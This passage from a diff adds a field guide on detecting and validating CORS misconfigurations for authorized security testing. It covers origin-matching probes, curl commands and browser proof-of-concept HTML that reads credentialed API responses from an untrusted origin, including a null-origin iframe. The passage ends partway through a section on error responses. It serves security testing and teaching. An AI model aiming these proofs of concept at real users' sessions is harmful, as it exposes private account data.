@@ -1,0 +1,3231 @@
+================================================================================
+CORS MISCONFIGURATION — ULTIMATE ADVANCED DETECTION, VALIDATION & EXPLOITATION
+FIELD GUIDE
+Version: 4.0 — Complete Master Edition
+Scope: Authorized Bug Bounty, Web Application Security Testing, API Security
+Assessment, and Penetration Testing
+================================================================================
+
+IMPORTANT: Perform these tests only against systems you own or are explicitly
+authorized to assess. Use controlled attacker-origin infrastructure and test
+accounts. Do not access, collect, or retain real users' private information.
+
+================================================================================
+TABLE OF CONTENTS
+================================================================================
+
+PART I — FOUNDATIONS
+  1. Objective
+  2. Understanding CORS
+  3. Important CORS Headers
+  4. CORS Misconfiguration Classification
+
+PART II — RECONNAISSANCE & BASIC TESTING
+  5. Reconnaissance and Endpoint Discovery
+  6. Master Origin Testing Matrix
+  7. Basic CORS Detection Using curl
+  8. Preflight Request Testing
+  9. Simple Request vs Preflight Differential Testing
+
+PART III — BROWSER VALIDATION
+  10. Browser-Based Exploitability Validation
+  11. Authentication, Cookie and Browser Conditions
+  12. Origin Parser and Normalization Testing
+
+PART IV — ADVANCED TECHNIQUES
+  13. Redirect-Chain CORS Testing
+  14. Preflight Cache and Policy-Transition Testing
+  15. CDN, Reverse Proxy, WAF and API Gateway Inconsistencies
+  16. CORS on Error Responses
+  17. Authentication-State Differential Testing
+  18. API Version and Alternate-Host Comparison
+  19. Wildcard CORS with Network-Level Access Control
+  20. Browser Privacy and Credential-Mode Testing
+  21. Private Network Access (PNA) Investigation
+  22. WebSocket Origin Validation (Separate Category)
+
+PART V — ULTIMATE ADVANCED TECHNIQUES (V4.0 NEW)
+  23. DNS Rebinding Combined with CORS Policy Manipulation
+  24. Cross-Site Leaks (XS-Leaks) and CORS Error Leaks
+  25. JSONP and Legacy XSSI Data Exposure
+  26. Service Worker CORS Bypass Behaviors
+  27. postMessage Origin Validation Weaknesses
+  28. CORP, COEP, COOP and CORS Interaction
+  29. Browser Differential Behavior (Chrome, Firefox, Safari, Edge)
+  30. HTTP/2, HTTP/3 and Request Smuggling Interactions
+  31. Mobile, WebView and Electron CORS Behavior
+  32. document.domain and Legacy Trust Boundaries
+  33. Access-Control-Expose-Headers Exploitation
+  34. Timing-Allow-Origin and Resource Timing Leaks
+
+PART VI — AUTOMATION & VALIDATION
+  35. Advanced Automation and Detection Strategy
+  36. Headless-Browser Validation with Playwright/Puppeteer
+  37. Tooling and Extensions
+  38. Burp Suite Testing Workflow
+
+PART VII — ANALYSIS & REPORTING
+  39. Origin Parser Payload Corpus
+  40. Real-World Case Studies and CVEs
+  41. False-Positive Elimination
+  42. Exploitability Validation Decision Tree
+  43. Impact and Severity Assessment
+  44. Professional Bug Bounty Report Template
+  45. Remediation and Secure Configuration
+
+PART VIII — CHECKLISTS & CONCLUSION
+  46. Master Testing Checklist
+  47. Final Detection Logic
+  48. Advanced Testing Principles
+  49. References and Further Reading
+  50. Final Conclusion
+
+================================================================================
+PART I — FOUNDATIONS
+================================================================================
+
+================================================================================
+1. OBJECTIVE
+================================================================================
+
+This document provides a comprehensive methodology for identifying, testing,
+validating, classifying, and reporting Cross-Origin Resource Sharing (CORS)
+security misconfigurations.
+
+It covers:
+
+- CORS fundamentals and browser security behavior
+- Common and advanced CORS misconfigurations
+- Origin validation and parser differential testing
+- Subdomain and third-party origin trust
+- Null-origin testing
+- Credentialed CORS testing
+- Preflight and actual-request analysis
+- Browser-based exploitability validation
+- Authentication and authorization state comparisons
+- Redirect-chain testing
+- CDN, reverse proxy, WAF, and API gateway inconsistencies
+- Cache-related CORS issues
+- Error-response CORS behavior
+- API version and alternate-host comparisons
+- Private Network Access investigation
+- DNS rebinding combined with CORS policy manipulation
+- Cross-Site Leaks (XS-Leaks) including CORS error leaks
+- JSONP / XSSI legacy data exposure
+- Service Worker CORS bypass behaviors
+- postMessage origin validation weaknesses
+- CORP / COEP / COOP interaction with CORS
+- Browser-differential behavior (Chrome, Firefox, Safari, Edge)
+- Headless-browser validation automation (Playwright/Puppeteer)
+- CORS automation and response classification
+- False-positive elimination
+- Impact assessment and professional reporting
+
+================================================================================
+2. UNDERSTANDING CORS
+================================================================================
+
+2.1 What is CORS?
+
+Cross-Origin Resource Sharing (CORS) is a browser security mechanism that allows
+a server to specify which origins may access its responses through browser-based
+cross-origin requests.
+
+Browsers implement the Same-Origin Policy (SOP), which restricts JavaScript
+running on one origin from freely reading resources belonging to another origin.
+
+An origin consists of:
+
+- Scheme
+- Hostname
+- Port
+
+Examples:
+
+  https://example.com
+  https://api.example.com
+  http://example.com
+  https://example.com:8443
+
+These are different origins.
+
+The following URLs belong to the same origin:
+
+  https://example.com/page1
+  https://example.com/api/profile
+  https://example.com/dashboard
+
+Their paths differ, but their scheme, hostname, and port are identical.
+
+2.2 What CORS does not do
+
+CORS is not:
+- Authentication
+- Authorization
+- An access-control system for non-browser clients
+- A replacement for CSRF protection
+- A firewall
+- A mechanism that prevents requests from reaching a server
+- A mechanism that protects secrets from every client
+
+CORS primarily controls whether browser JavaScript can access a cross-origin
+response.
+
+A request may reach the server even when the browser prevents JavaScript from
+reading its response.
+
+This distinction is essential when evaluating findings.
+
+2.3 Same-Origin Policy versus CORS
+
+Example:
+
+  Victim application:  https://app.example.com
+  Attacker-controlled website:  https://attacker.example
+  API:  https://api.example.com
+
+JavaScript running on the attacker website attempts to read the API response.
+
+Without an appropriate CORS response, the browser normally prevents the script
+from accessing that response.
+
+If the API incorrectly trusts the attacker's origin, the browser may allow the
+script to read the response.
+
+================================================================================
+3. IMPORTANT CORS HEADERS
+================================================================================
+
+3.1 Origin
+
+Sent by the browser to identify the requesting origin.
+
+  Origin: https://attacker.example
+
+The Origin header generally contains the scheme, hostname, and port, without a
+path.
+
+It may also contain:
+
+  Origin: null
+
+The value null can represent an opaque origin, including certain sandboxed
+documents and other browser contexts.
+
+3.2 Access-Control-Allow-Origin
+
+Specifies the origin allowed to access the response.
+
+  Access-Control-Allow-Origin: https://trusted.example
+  Access-Control-Allow-Origin: *
+
+Potentially dangerous behavior:
+
+  Access-Control-Allow-Origin: https://attacker.example
+
+when the server dynamically reflects an arbitrary untrusted Origin.
+
+3.3 Access-Control-Allow-Credentials
+
+Controls whether the browser may expose the response to a credentialed
+cross-origin request.
+
+  Access-Control-Allow-Credentials: true
+
+For credentialed CORS, the server must return a specific allowed origin rather
+than *.
+
+This combination does not enable credentialed browser response sharing:
+
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Credentials: true
+
+Browsers reject wildcard ACAO for credentialed response sharing.
+
+3.4 Access-Control-Allow-Methods
+
+Specifies methods allowed for preflighted cross-origin requests.
+
+  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+
+A permissive method list is not automatically a vulnerability.
+
+3.5 Access-Control-Allow-Headers
+
+Specifies request headers allowed during preflight.
+
+  Access-Control-Allow-Headers: Authorization, Content-Type, X-Requested-With
+
+3.6 Access-Control-Expose-Headers
+
+Allows JavaScript to read additional response headers.
+
+  Access-Control-Expose-Headers: X-Auth-Token, X-User-ID, X-Internal-Reference
+
+Investigate whether exposed headers contain sensitive information.
+
+3.7 Access-Control-Max-Age
+
+Controls how long the browser may cache a successful preflight result.
+
+  Access-Control-Max-Age: 3600
+
+A long value is not inherently vulnerable. Investigate whether cached preflight
+permissions interact with changing policies or authentication state.
+
+3.8 Vary: Origin
+
+When the server dynamically changes CORS headers according to the request's
+Origin, it should generally include:
+
+  Vary: Origin
+
+This helps HTTP caches distinguish responses generated for different origins.
+
+Missing Vary: Origin is not automatically exploitable. Demonstrate an actual
+cache-related security impact before reporting it as a vulnerability.
+
+3.9 Timing-Allow-Origin
+
+  Timing-Allow-Origin: https://trusted.example
+
+Controls which origins may access detailed Resource Timing data (performance
+timing entries) for a resource. Relevant to XS-Leaks and timing attacks.
+Absence or misconfiguration can leak response sizes or cache status.
+
+================================================================================
+4. CORS MISCONFIGURATION CLASSIFICATION
+================================================================================
+
+4.1 Arbitrary Origin Reflection
+
+The server reflects the supplied Origin without validating whether it is
+trusted.
+
+Request:
+
+  GET /api/profile HTTP/1.1
+  Host: api.example.com
+  Origin: https://attacker.example
+
+Vulnerable-looking response:
+
+  HTTP/1.1 200 OK
+  Access-Control-Allow-Origin: https://attacker.example
+  Access-Control-Allow-Credentials: true
+  Content-Type: application/json
+
+Potential impact:
+
+If the endpoint returns sensitive authenticated information and a browser sends
+the victim's eligible credentials, attacker-controlled JavaScript may be able to
+read the response.
+
+Required validation:
+1. Use an origin you control.
+2. Send the request with a test account.
+3. Verify the exact CORS response.
+4. Test in a real browser.
+5. Confirm that the response is readable by JavaScript.
+6. Identify the sensitive information exposed.
+
+Do not report reflection alone as confirmed data exposure.
+
+4.2 Null-Origin Trust
+
+Some servers explicitly or accidentally trust:
+
+  Origin: null
+
+Potentially vulnerable response:
+
+  Access-Control-Allow-Origin: null
+  Access-Control-Allow-Credentials: true
+
+A controlled browser test can use a sandboxed iframe that has an opaque origin.
+
+  <iframe sandbox="allow-scripts" srcdoc="
+    <script>
+      fetch('https://api.example.com/api/profile', { credentials: 'include' })
+        .then(async r => parent.postMessage(await r.text(), '*'))
+        .catch(e => parent.postMessage('err: ' + e, '*'));
+    </script>
+  "></iframe>
+
+The sandboxed document has an opaque origin in this configuration.
+
+Important considerations:
+- Verify that the actual request carries Origin: null.
+- Verify the response's ACAO value.
+- Check browser cookie restrictions.
+- Do not assume every null-origin context has identical behavior.
+- Confirm browser readability.
+
+Other producers of null origin:
+- Sandboxed iframes (without allow-same-origin)
+- data: URLs
+- file: URLs (in some browsers)
+- Some redirects from HTTPS to HTTP (historical)
+- Cross-origin isolated opaque origins
+
+4.3 Weak Origin Validation
+
+Examples of unsafe validation patterns:
+- Substring matching
+- Prefix matching
+- Suffix matching without a hostname boundary
+- Weak regular expressions
+- Incomplete hostname comparisons
+- Scheme-insensitive validation
+- Port-insensitive validation
+- Unintended trust of arbitrary subdomains
+
+Example of dangerous suffix logic:
+
+  if origin ends with "example.com": allow
+
+Potentially trusted incorrectly:
+
+  https://example.com.attacker.example
+  https://notexample.com
+
+The correct solution is not a more complicated regex. Parse the origin and
+compare its normalized scheme, hostname, and port against an explicit allowlist.
+
+4.4 Insecure Subdomain Trust
+
+The application may trust every subdomain:
+
+  Access-Control-Allow-Origin: https://*.example.com
+
+Potential risk: A compromised, abandoned, or attacker-controlled subdomain may
+become a trusted origin.
+
+Investigate:
+- Dangling DNS records
+- Subdomain takeover exposure
+- User-generated subdomains
+- Hosted customer subdomains
+- Legacy applications
+- Untrusted tenant-controlled hostnames
+- Third-party hosted content
+- Subdomain XSS
+
+A subdomain takeover is not automatically a CORS vulnerability. Demonstrate that
+the affected subdomain is trusted by the sensitive API and that the trust can be
+abused.
+
+4.5 Insecure HTTP Origin Trust
+
+Example:
+
+  Access-Control-Allow-Origin: http://trusted.example
+  Access-Control-Allow-Credentials: true
+
+Investigate whether a sensitive HTTPS API trusts an HTTP origin.
+
+Potential concerns:
+- Network attackers may be able to interfere with an insecure origin.
+- HTTP-hosted applications may be exposed to compromise.
+- A trusted origin may be vulnerable to content injection.
+
+Consider browser mixed-content restrictions and actual cookie behavior. Do not
+assume an HTTP-origin request is automatically capable of reading every HTTPS
+response.
+
+4.6 Wildcard CORS
+
+Example:
+
+  Access-Control-Allow-Origin: *
+
+Wildcard CORS permits browser JavaScript from arbitrary origins to read
+eligible responses that do not require credentialed sharing.
+
+Potential impact may exist when:
+- Sensitive information is available without browser credentials.
+- The endpoint relies on network-level controls rather than browser credentials.
+- Internal resources are unintentionally exposed to websites able to reach them.
+- A supposedly private endpoint is actually accessible from an
+  attacker-controlled browser context.
+
+Wildcard ACAO does not enable credentialed response sharing.
+
+4.7 Credentialed CORS Misconfiguration
+
+Example:
+
+  Access-Control-Allow-Origin: https://attacker.example
+  Access-Control-Allow-Credentials: true
+
+This is particularly important when:
+- The endpoint returns account information.
+- The browser sends eligible session cookies.
+- The response contains private information.
+- The attacker can control the requesting origin.
+
+Credentialed CORS does not bypass authentication or browser cookie restrictions
+by itself.
+
+4.8 Overly Permissive Preflight Configuration
+
+Example:
+
+  Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS
+  Access-Control-Allow-Headers: *
+
+Potentially risky behavior includes allowing untrusted origins to perform
+preflighted requests using sensitive methods or headers.
+
+However:
+- A permissive OPTIONS response alone does not prove a vulnerability.
+- The actual request must be evaluated.
+- The response must be readable for a CORS data-exposure finding.
+- Authentication and authorization must still be assessed separately.
+
+4.9 CORS on Sensitive API Endpoints
+
+Prioritize endpoints returning:
+
+  /api/profile
+  /api/account
+  /api/users/me
+  /api/settings
+  /api/billing
+  /api/payment-methods
+  /api/orders
+  /api/transactions
+  /api/tokens
+  /api/keys
+  /api/private-data
+  /api/admin
+  /api/organization
+  /api/members
+  /api/graphql
+
+These are discovery examples, not proof that the endpoints exist or are
+vulnerable.
+
+4.10 CORS and IDOR
+
+An IDOR occurs when a user can access another user's object without appropriate
+authorization.
+
+CORS may make an IDOR more exploitable in a browser context if an
+attacker-controlled origin can read the response.
+
+Test with two accounts you control. Do not access unrelated users' records.
+
+4.11 CORS and XSS
+
+An XSS vulnerability on a trusted origin can be particularly dangerous if that
+origin is allowed to read sensitive API responses.
+
+Investigate:
+- Trusted subdomains
+- User-controlled content hosts
+- Legacy applications
+- Untrusted third-party integrations
+- Stored and reflected XSS on allowed origins
+
+CORS does not create the XSS vulnerability. It may increase the impact of an
+existing weakness.
+
+4.12 CORS and JWT / Token Exposure
+
+Investigate whether a readable response exposes:
+- Access tokens
+- Refresh tokens
+- API keys
+- Session identifiers
+- Sensitive authentication metadata
+
+Do not assume that exposing a token is equivalent to account takeover. Verify
+token scope, expiration, audience, revocation behavior, and actual security
+impact using a test account.
+
+4.13 CORS and GraphQL
+
+Investigate:
+
+  /graphql
+  /api/graphql
+  /graphql/v1
+
+Check:
+- Introspection exposure
+- Authenticated queries
+- User-specific data
+- Organization information
+- Sensitive mutations
+- Error responses
+- CORS behavior across GET and POST
+- GraphQL batching CORS behavior
+- Persisted query CORS behavior
+
+GraphQL authorization flaws remain separate vulnerabilities. CORS may make
+sensitive responses readable from an untrusted origin.
+
+4.14 CORS and Path Traversal
+
+If an application has a path traversal vulnerability, investigate whether the
+affected endpoint also returns readable cross-origin responses.
+
+Do not label a path traversal issue as a CORS issue unless the CORS
+configuration independently contributes to the demonstrated impact.
+
+4.15 Third-Party Origin Trust
+
+Investigate APIs trusting origins belonging to:
+- External SaaS platforms
+- Marketing platforms
+- Customer portals
+- Support portals
+- Analytics dashboards
+- Hosted documentation
+- Legacy integrations
+
+Trusting a third-party origin can be dangerous if that origin is compromised or
+permits attacker-controlled content.
+
+Demonstrate the actual trust relationship and impact.
+
+4.16 CORS and CSRF Interaction
+
+A critical distinction to master:
+
+- CSRF attacks cause state-changing requests without reading the response.
+- CORS misconfigurations enable reading responses.
+
+When they combine:
+- A blind CSRF (state change, no read) can become a readable CSRF
+  (state change + data exfiltration) if CORS permits the response to be read.
+- Conversely, a strong CORS policy does not prevent CSRF — these are separate
+  controls.
+- Report them as separate findings with clarified impact.
+
+When assessing a CORS issue on a state-changing endpoint, determine whether:
+- The endpoint is CSRF-protected (token, SameSite, Origin check).
+- The CORS policy permits reading a pre-CSRF response (e.g., a CSRF token
+  retrieval endpoint).
+- The CORS policy permits reading a response after a state change.
+
+================================================================================
+PART II — RECONNAISSANCE & BASIC TESTING
+================================================================================
+
+================================================================================
+5. RECONNAISSANCE AND ENDPOINT DISCOVERY
+================================================================================
+
+5.1 Identify API Hosts
+
+Review authorized application traffic for:
+
+  api.example.com
+  api-v1.example.com
+  api-v2.example.com
+  auth.example.com
+  account.example.com
+  gateway.example.com
+  graphql.example.com
+  mobile-api.example.com
+
+5.2 Identify API Routes
+
+Review:
+- Browser developer tools
+- JavaScript application bundles
+- Source maps where authorized
+- API documentation
+- OpenAPI / Swagger definitions
+- Postman collections
+- Mobile application traffic where in scope
+- Burp Suite HTTP history
+- Existing application routes
+- Publicly accessible API references
+
+5.3 Prioritize Sensitive Endpoints
+
+Focus on routes that return:
+- Personal information
+- Account details
+- Organization data
+- Payment metadata
+- Authentication information
+- Privileged configuration
+- Internal application data
+
+5.4 Record a Baseline
+
+For each endpoint, record:
+
+  URL:
+  HTTP method:
+  Authentication required:
+  Expected response:
+  Status code:
+  Content-Type:
+  Origin:
+  Access-Control-Allow-Origin:
+  Access-Control-Allow-Credentials:
+  Access-Control-Allow-Methods:
+  Access-Control-Allow-Headers:
+  Access-Control-Expose-Headers:
+  Access-Control-Max-Age:
+  Vary:
+  Cache-Control:
+  Redirect behavior:
+  Response sensitivity:
+
+================================================================================
+6. MASTER ORIGIN TESTING MATRIX
+================================================================================
+
+Test the following origins against authorized endpoints.
+
+  Test                 Example                                What to investigate
+  -------------------- -------------------------------------- -------------------------
+  Trusted origin       https://trusted.example                Expected policy
+  Untrusted origin     https://attacker.example               Arbitrary trust
+  Null origin          null                                    Opaque-origin trust
+  HTTP origin          http://trusted.example                  Insecure scheme trust
+  Alternate port       https://trusted.example:8443            Port validation
+  Subdomain            https://sub.trusted.example             Subdomain trust
+  Unrelated hostname   https://nottrusted.example              Weak matching
+  Suffix confusion     https://trusted.example.attacker.example Unsafe suffix
+  Prefix confusion     https://trusted-example.attacker.example Unsafe prefix
+  Case variation       https://TRUSTED.example                 Parser normalization
+  Trailing dot         https://trusted.example.                Host normalization
+  Default port         https://trusted.example:443             Port normalization
+  Non-default port     https://trusted.example:444             Port validation
+  User-info confusion  https://trusted.example@attacker.example URL parser confusion
+  IDN hostname         Punycode equivalent                     IDN handling
+  IPv6 host            https://[::1]                           Address parsing
+  Malformed input      Carefully constructed variants          Parser differential
+
+These are server-side validation probes. Some malformed Origin values cannot be
+generated by ordinary browser JavaScript. A response to such a probe is not
+proof of a browser-exploitable CORS issue.
+
+Always validate realistic behavior in a browser.
+
+================================================================================
+7. BASIC CORS DETECTION USING CURL
+================================================================================
+
+7.1 Test an Untrusted Origin
+
+  curl -i -H "Origin: https://attacker.example" \
+    https://api.example.com/api/profile
+
+Review:
+  Access-Control-Allow-Origin
+  Access-Control-Allow-Credentials
+  Vary
+
+7.2 Test a Null Origin
+
+  curl -i -H "Origin: null" \
+    https://api.example.com/api/profile
+
+7.3 Test a Trusted Origin
+
+  curl -i -H "Origin: https://trusted.example" \
+    https://api.example.com/api/profile
+
+7.4 Test an Unrelated Origin
+
+  curl -i -H "Origin: https://unrelated.example" \
+    https://api.example.com/api/profile
+
+7.5 Test Credentialed Behavior
+
+Use a dedicated test account and a valid test session cookie:
+
+  curl -i -H "Origin: https://attacker.example" \
+    -H "Cookie: session=TEST_ACCOUNT_SESSION" \
+    https://api.example.com/api/profile
+
+Replace the placeholder with a test-account cookie.
+
+Remember: curl does not enforce browser CORS rules. It only shows the server
+response.
+
+7.6 Test Response Headers
+
+  curl -sS -D - -o /dev/null \
+    -H "Origin: https://attacker.example" \
+    https://api.example.com/api/profile
+
+================================================================================
+8. PREFLIGHT REQUEST TESTING
+================================================================================
+
+8.1 What is a Preflight Request?
+
+A browser may send an OPTIONS request before a cross-origin request when the
+method, headers, or content type require preflight.
+
+  OPTIONS /api/profile HTTP/1.1
+  Host: api.example.com
+  Origin: https://attacker.example
+  Access-Control-Request-Method: PUT
+  Access-Control-Request-Headers: authorization, content-type
+
+8.2 Example Preflight Response
+
+  HTTP/1.1 204 No Content
+  Access-Control-Allow-Origin: https://attacker.example
+  Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+  Access-Control-Allow-Headers: Authorization, Content-Type
+  Access-Control-Allow-Credentials: true
+  Access-Control-Max-Age: 3600
+
+Investigate whether the server grants permissions to untrusted origins.
+
+8.3 Test with curl
+
+  curl -i -X OPTIONS \
+    -H "Origin: https://attacker.example" \
+    -H "Access-Control-Request-Method: PUT" \
+    -H "Access-Control-Request-Headers: authorization,content-type" \
+    https://api.example.com/api/profile
+
+8.4 Preflight Validation Checklist
+
+- Is OPTIONS handled correctly?
+- Does the server validate the Origin?
+- Are methods restricted to what is necessary?
+- Are request headers restricted appropriately?
+- Does the server permit credentials?
+- Does the actual request succeed?
+- Can browser JavaScript read the actual response?
+- Does the preflight policy differ by endpoint?
+- Does it differ by authentication state?
+- Does it differ between infrastructure layers?
+
+An OPTIONS response alone is not a confirmed vulnerability.
+
+================================================================================
+9. SIMPLE REQUEST VS PREFLIGHT DIFFERENTIAL TESTING
+================================================================================
+
+Not every cross-origin request requires preflight.
+
+A browser can send certain simple requests without an OPTIONS preflight.
+
+Common CORS-safelisted methods:
+  GET
+  HEAD
+  POST
+
+Common safelisted request Content-Type values include:
+  application/x-www-form-urlencoded
+  multipart/form-data
+  text/plain
+
+Additional restrictions apply to request headers and content types.
+
+Compare behavior across:
+1. GET
+2. HEAD
+3. POST with application/x-www-form-urlencoded
+4. POST with multipart/form-data
+5. POST with text/plain
+6. POST with application/json
+7. PUT
+8. PATCH
+9. DELETE
+10. Requests with Authorization
+11. Requests with custom headers
+
+Example:
+
+  curl -i -X POST \
+    -H "Origin: https://attacker.example" \
+    -H "Content-Type: text/plain" \
+    --data "test=1" \
+    https://api.example.com/api/test
+
+Then compare with:
+
+  curl -i -X POST \
+    -H "Origin: https://attacker.example" \
+    -H "Content-Type: application/json" \
+    --data '{"test":1}' \
+    https://api.example.com/api/test
+
+Investigate whether simple requests and preflighted requests are handled by
+different policies.
+
+SECURITY DISTINCTION: A cross-origin request that changes server state but whose
+response cannot be read may be relevant to CSRF, not necessarily CORS. Assess
+CSRF protections separately.
+
+================================================================================
+PART III — BROWSER VALIDATION
+================================================================================
+
+================================================================================
+10. BROWSER-BASED EXPLOITABILITY VALIDATION
+================================================================================
+
+A real browser test is essential for demonstrating that JavaScript can read a
+cross-origin response.
+
+10.1 Basic Credentialed CORS PoC
+
+Host this HTML on a controlled origin that is not trusted by the target API.
+
+  <!DOCTYPE html>
+  <html>
+  <head>
+    <title>CORS Security Validation</title>
+  </head>
+  <body>
+    <h2>CORS Validation</h2>
+    <pre id="result">Testing...</pre>
+
+    <script>
+      const target = "https://api.example.com/api/profile";
+
+      fetch(target, { method: "GET", credentials: "include" })
+        .then(async response => {
+          const body = await response.text();
+          document.getElementById("result").textContent =
+            "HTTP Status: " + response.status + "\n\n" + body;
+        })
+        .catch(error => {
+          document.getElementById("result").textContent =
+            "Browser blocked access or request failed: " + error;
+        });
+    </script>
+  </body>
+  </html>
+
+Expected successful validation:
+- The request reaches the endpoint.
+- The browser sends eligible test-account credentials.
+- The server returns permissive CORS headers.
+- JavaScript can read the response body.
+
+A successful response using curl or Burp is not sufficient.
+
+10.2 Authorization Header PoC
+
+Use only a token belonging to your own test account.
+
+  <script>
+  const testToken = "YOUR_TEST_ACCOUNT_TOKEN";
+
+  fetch("https://api.example.com/api/profile", {
+    method: "GET",
+    headers: { "Authorization": "Bearer " + testToken }
+  })
+  .then(r => r.text())
+  .then(d => console.log("Readable response:", d))
+  .catch(e => console.error("Request failed or response blocked:", e));
+  </script>
+
+Important: An attacker-controlled website does not automatically know a victim's
+bearer token. Do not claim token theft unless the token is actually exposed
+through a demonstrated attack path.
+
+10.3 Browser Validation Checklist
+
+- Use a real supported browser.
+- Host the PoC on an origin you control.
+- Use a dedicated test account.
+- Open the PoC in a separate browser context.
+- Check browser developer tools.
+- Inspect the actual request Origin.
+- Inspect whether cookies were sent.
+- Inspect the response headers.
+- Confirm whether JavaScript can read the body.
+- Repeat without credentials as a control test.
+- Record browser and version.
+- Record cookie and privacy settings.
+
+================================================================================
+11. AUTHENTICATION, COOKIE AND BROWSER CONDITIONS
+================================================================================
+
+11.1 Credential Modes
+
+The Fetch API supports:
+
+  fetch(url, { credentials: "omit" });
+  fetch(url, { credentials: "same-origin" });
+  fetch(url, { credentials: "include" });
+
+For cross-origin credentialed requests, include is generally the relevant mode.
+
+11.2 Cookie Attributes
+
+Review:
+
+  Set-Cookie: session=VALUE; Secure; HttpOnly; SameSite=None
+
+  Attribute        Meaning
+  ---------------- --------------------------------------------------------
+  Secure           Cookie restricted to secure transport
+  HttpOnly         JavaScript cannot directly read the cookie
+  SameSite=Strict  Restricts cross-site cookie sending
+  SameSite=Lax     Allows limited cross-site cookie behavior
+  SameSite=None    Allows cross-site cookie use when other browser conditions permit
+
+Browser privacy protections and third-party cookie restrictions may prevent
+cookies from being sent even when CORS is permissive.
+
+11.3 HttpOnly Is Not a Complete CORS Defense
+
+HttpOnly prevents JavaScript from reading the cookie value directly.
+
+It does not prevent an eligible cookie from being attached to a credentialed
+fetch request.
+
+Therefore, a CORS vulnerability may expose authenticated response data without
+exposing the cookie itself.
+
+11.4 Authentication-State Differential Testing
+
+Compare behavior with:
+- Logged-out session
+- Logged-in test account
+- Expired session
+- Revoked test session
+- Second test account
+- Different test-account roles
+- Different tenant or organization contexts, if authorized
+
+Record:
+
+  Authentication state:
+  Request status:
+  Cookie sent:
+  Response status:
+  Response data:
+  ACAO:
+  ACAC:
+  Vary:
+  Browser-readable:
+
+Look for CORS policy changes between authentication states.
+
+Use only accounts you control.
+
+================================================================================
+12. ORIGIN PARSER AND NORMALIZATION TESTING
+================================================================================
+
+This technique investigates differences between the way an application, reverse
+proxy, framework, and browser interpret an Origin value.
+
+12.1 Why It Matters
+
+A backend might use unsafe string matching while another component uses URL
+parsing.
+
+This can produce inconsistent trust decisions.
+
+Test carefully constructed values such as:
+
+  https://trusted.example
+  https://TRUSTED.example
+  https://trusted.example.
+  https://trusted.example:443
+  https://trusted.example:444
+  https://trusted.example.attacker.example
+  https://trusted-example.example
+  https://trusted.example@attacker.example
+  http://trusted.example
+  https://[::1]
+
+For internationalized domains, compare the Unicode hostname with its correctly
+encoded Punycode form.
+
+12.2 Investigate
+
+- Case normalization
+- Trailing dots
+- Default ports
+- Non-default ports
+- Scheme validation
+- User-info parsing
+- IPv4 and IPv6 parsing
+- IDN handling
+- Whitespace rejection
+- Invalid syntax rejection
+- Percent-encoding handling
+- Backslash handling
+- Reverse-proxy normalization
+- Framework URL parsing
+- Duplicate or conflicting Origin handling
+
+12.3 Critical Validation Rule
+
+An unusual response to a malformed Origin value is not automatically
+exploitable.
+
+Some values cannot be sent by a standards-compliant browser.
+
+Use malformed inputs to discover server-side validation flaws, then identify a
+realistic browser-generated Origin that reaches the same unsafe trust decision.
+
+The strongest evidence is a browser-generated origin that the application
+incorrectly trusts.
+
+================================================================================
+PART IV — ADVANCED TECHNIQUES
+================================================================================
+
+================================================================================
+13. REDIRECT-CHAIN CORS TESTING
+================================================================================
+
+Investigate redirects on sensitive API endpoints.
+
+Test:
+- Same-origin redirects
+- Cross-origin redirects
+- HTTP-to-HTTPS redirects
+- Redirects to login pages
+- Redirects after session expiration
+- Redirects to error pages
+- Redirects after preflight
+- Redirects between API versions
+- Redirects through a gateway
+
+Record each relevant response:
+
+  Initial URL:
+  Initial status:
+  Location:
+  Initial CORS headers:
+
+  Redirect destination:
+  Redirect status:
+  Redirect CORS headers:
+
+  Final URL:
+  Final status:
+  Final CORS headers:
+  Final response readable in browser:
+
+Use controlled endpoints and browser developer tools.
+
+CORS behavior around redirects, especially following preflight, has
+browser-specific constraints. Do not assume that a successful redirect in curl
+means the same request will succeed in a browser.
+
+A redirect-chain observation is not a vulnerability without demonstrated
+security impact.
+
+================================================================================
+14. PREFLIGHT CACHE AND POLICY-TRANSITION TESTING
+================================================================================
+
+Investigate whether cached preflight permissions interact with changing server
+policies.
+
+14.1 Relevant Header
+
+  Access-Control-Max-Age: 3600
+
+14.2 Test Methodology
+
+1. Send a preflighted request from a controlled untrusted origin.
+2. Record the preflight response.
+3. Record the allowed methods and headers.
+4. Record Access-Control-Max-Age.
+5. Repeat the request within the cache period.
+6. Compare the behavior with a fresh browser context.
+7. Compare behavior after authentication-state changes.
+8. Compare behavior after a policy change, where the environment permits it.
+9. Verify the actual request and readable response.
+
+14.3 Investigate
+
+- Different preflight policies for different origins
+- Different policies by endpoint
+- Different policies by authentication state
+- Cached permissions after policy transitions
+- Method and header inconsistencies
+- Browser-specific preflight caching behavior
+
+Do not claim that a long Max-Age is vulnerable by itself.
+
+================================================================================
+15. CDN, REVERSE PROXY, WAF AND API GATEWAY INCONSISTENCIES
+================================================================================
+
+A typical architecture may look like:
+
+  Browser  ->  CDN  ->  WAF / Reverse Proxy  ->  API Gateway  ->  Backend
+
+Different layers may add, remove, overwrite, or cache CORS headers.
+
+15.1 Investigate
+
+- CDN-generated ACAO
+- Backend-generated ACAO
+- Duplicate ACAO headers
+- Duplicate ACAC headers
+- Header merging
+- Header overwriting
+- Cached CORS responses
+- Authentication-dependent headers
+- Different backend instances
+- Route-specific CORS policies
+- WAF-generated error responses
+- Gateway-specific OPTIONS handling
+
+15.2 Useful Response Metadata
+
+  Age:
+  Via:
+  X-Cache:
+  X-Cache-Hits:
+  ETag:
+  Cache-Control:
+  Vary:
+  Server:
+
+These headers can help identify caching and infrastructure behavior, but they
+are not proof of a vulnerability.
+
+15.3 Differential Testing
+
+Compare responses for:
+
+  Origin A
+  Origin B
+  Origin C
+  No Origin header
+
+Then compare:
+
+  First request
+  Repeated request
+  Fresh browser session
+  Different test-account state
+  Different authorized endpoint
+
+Check whether one origin's CORS response is reused for another origin.
+
+15.4 Duplicate ACAO
+
+Example:
+
+  Access-Control-Allow-Origin: https://trusted.example
+  Access-Control-Allow-Origin: https://attacker.example
+
+Different browsers, libraries, proxies, and clients may handle malformed or
+duplicate headers differently.
+
+Do not assume the browser accepts the response. Validate the actual browser
+behavior.
+
+================================================================================
+16. CORS ON ERROR RESPONSES
+================================================================================
+
+Applications may apply different CORS policies to normal and error responses.
+
+Test controlled response conditions:
+
+  200 OK
+  204 No Content
+  301 Moved Permanently
+  302 Found
